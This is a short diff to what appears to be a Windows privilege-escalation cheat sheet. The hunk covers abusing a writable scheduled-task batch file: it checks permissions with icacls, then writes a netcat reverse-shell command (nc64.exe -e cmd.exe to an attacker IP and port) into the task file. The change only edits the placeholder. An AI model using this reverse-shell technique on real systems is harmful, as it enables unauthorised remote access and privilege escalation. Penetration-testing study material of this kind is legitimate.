@@ -89,7 +89,7 @@ icacls [FILE-PATH]
 * Look for (F) in BUILTIN\Users
 * Echo payload into file example:
 ```
-echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+echo c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT] > C:\tasks\schtask.bat
 ```
 * Start a listener on attack machine
 * Run the task:
